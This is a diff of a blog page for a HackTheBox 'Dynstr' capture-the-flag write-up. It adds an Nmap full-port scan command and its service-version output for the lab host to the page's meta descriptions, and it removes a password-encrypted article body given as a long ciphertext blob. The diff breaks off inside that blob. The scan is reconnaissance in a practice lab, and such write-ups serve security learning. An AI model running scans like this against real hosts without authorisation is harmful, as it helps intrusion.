@@ -4,7 +4,9 @@
 <title>Dynstr - HackTheBox machine :: RoundofThree</title>
 <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<meta content=" Rank: medium " name="description"/>
+<meta content="Foothold 1- Nmap discovered ports 22, 80, 53.
+80 -&amp;gt; Apache/2.4.41 53 -&amp;gt; ISC BIND 9.16.1
+# Nmap 7.91 scan initiated Wed Sep 1 19:36:11 2021 as: nmap -sC -sV -p- -v -oA tcp dynstr.htb Nmap scan report for dynstr.htb (10.10.10.244) Host is up (0.090s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) | 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open domain ISC BIND 9." name="description"/>
 <meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
 <meta content="noodp" name="robots"/>
 <link href="/labs/dynstr/" rel="canonical"/>
@@ -17,7 +19,9 @@
 <meta content="en" property="og:locale"/>
 <meta content="article" property="og:type"/>
 <meta content="Dynstr - HackTheBox machine" property="og:title"/>
-<meta content=" Rank: medium " property="og:description"/>
+<meta content="Foothold 1- Nmap discovered ports 22, 80, 53.
+80 -&amp;gt; Apache/2.4.41 53 -&amp;gt; ISC BIND 9.16.1
+# Nmap 7.91 scan initiated Wed Sep 1 19:36:11 2021 as: nmap -sC -sV -p- -v -oA tcp dynstr.htb Nmap scan report for dynstr.htb (10.10.10.244) Host is up (0.090s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA) | 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA) |_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519) 53/tcp open domain ISC BIND 9." property="og:description"/>
 <meta content="/labs/dynstr/" property="og:url"/>
 <meta content="RoundofThree" property="og:site_name"/>
 <meta content="/favicon.png" property="og:image"/>
@@ -74,19 +78,199 @@
     
   </span>
 <div class="post-content"><div>
-<ul>
-<li>Rank: medium</li>
-</ul>
-<div class="hugo-encryptor-container">
-<div class="hugo-encryptor-prompt">
-<p>Part of this article is encrypted with password:</p>
-</div>
-<div class="hugo-encryptor-form">
-<input class="hugo-encryptor-input" placeholder="Please input the password"/>
-<input class="hugo-encryptor-button" onclick="_click_handler(this)" type="button" value="Click to verify"/>
-</div>
-<div class="hugo-encryptor-cipher-text" style="display: none;">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